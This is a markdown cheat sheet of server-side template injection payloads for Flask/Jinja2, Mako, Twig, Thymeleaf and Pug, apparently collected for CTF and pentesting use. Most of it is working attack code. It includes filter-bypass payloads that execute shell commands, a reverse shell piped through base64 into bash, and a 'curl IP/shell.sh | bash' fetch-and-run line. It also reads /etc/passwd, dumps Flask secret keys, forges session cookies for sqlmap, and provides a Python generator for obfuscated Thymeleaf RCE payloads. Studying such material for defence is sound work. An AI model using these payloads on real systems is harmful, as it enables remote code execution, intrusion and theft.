# SSTI

## Flask-Jinja2

* **Get the secret key**

```
{{ config }}
```

```
{{config.getitems()}}

# Bypass "." filter
{{config|attr('getitems')()}}
```

* **Decrypt the cookie**

```
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```

* **SQLi in flask session with sqlmap**

```
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```

* **Bypass filtered ->** `'``_``.``{{}}``if``for`

```
{% with abuqasem=request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo <Base64EncodedReverseShellCommand> | base64 -d | bash -i")["read"]() %}abuqasem{% endwith %}
```

To exploit SSTI by image upload

```
{% with abuqasem=request["application"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("curl IP/shell.sh | bash")["read"]() %}
{{ abuqasem }}
{% endwith %}
```

* **Bypass filtered ->** `()`

```
# This was injected in an email field
"{{request.application['__globals__'].__builtins__.__import__﹙'os'﹚.popen﹙'cat flag.txt'﹚.read﹙﹚}}"@deafcon.com
```

> Link: https://unicode-search.net/unicode-namesearch.pl?term=PARENTHESIS

* **Bypass Filtered ('.','\_','|join','[',']','mro' ,'base','import','popen','builtins','os')**

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuil''tins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimp''ort\x5f\x5f')('o''s')|attr('po''pen')('id')|attr('read')()}}
```

* **Subprocess.Popen**

```
{{ [].__class__.__mro__[-1].__subclasses__()[233](["/usr/local/bin/score","9b9400f8-e969-47ca-9965-c7516f73d0e7"]).communicate() }}

{{ [].__class__.__mro__[-1].__subclasses__()[233]("whoami",shell=True,stdout=-1).communicate() }}
```

> **Note**: Try playing with stdout descriptor to get ouptut.

* Unique list of payloads

  + <https://ctf-ieki-xyz.translate.goog/library/ssti.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=ar>

## Mako

```
${self.template.module.runtime.util.os.popen('cat+/flag.txt').read()
```

More payloads: <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako>

## Twig 1.9

```
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}
```

## SpringBoot

### Thymleaf-engine

```
Variable expression ： ${...}
Select variable expression ： *{...}
Message expression ： #{....}
link URL expression ： @{...}
Fragment Expression ： ~{...}
```

* Read `/etc/passwd`

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

### Exploit Script

```
#!/usr/bin/python3

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}' 

count = 1
for i in converted:
    if count == 1:
        base_payload += f"(T(java.lang.Character).toString({i}).concat"
        count += 1
    elif count == len(converted):
        base_payload += f"(T(java.lang.Character).toString({i})))"
    else:
        base_payload += f"(T(java.lang.Character).toString({i})).concat"
        count += 1

print(base_payload + end_payload)
```

### References

* <https://javamana.com/2021/11/20211121071046977B.html>
* <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd>

## Pug

Bypass the following blacklist

```
global
process
mainModule
require
root
child_process
exec
constructor
execSync
spawn
eval
include
new
Function
!
\\
[
]
```

Payload:

```
%23{inspector=(obj)=>Object.values(Object.getOwnPropertyDescriptors(obj))}
%23{gadgets=inspector(gadgets=this.__proto__)}
%23{gadgets=gadgets.map(x=>inspector(x.value.__proto__).map(y=>y.value).filter(Boolean))}
%23{func=gadgets.pop().shift()}
%23{proc=func('return this.pro'+'cess')()}
%23{proc=Object.entries(proc).pop().pop()}
%23{proc=Object.entries(proc.__proto__)}
%23{proc.pop()}
%23{loader=proc.pop().pop()}
%23{chproc=loader('child_pr'+'ocess')}
%23{chproc=Object.entries(chproc)}
%23{sh=chproc.pop().pop()}
%23{sh('ls').stdout}
```

## Further reading

* <https://hackmd.io/@Chivato/HyWsJ31dI>
* <https://chowdera.com/2020/12/20201221231521371q.html>
* <https://jinja.palletsprojects.com/en/2.10.x/templates>/
* <https://book.hacktricks.xyz/pentesting/pentesting-web/flask>
* <https://habib-bahruddin.medium.com/pugjs-sandbox-bypass-lead-to-remote-code-execution-f7dc8e7a3563>

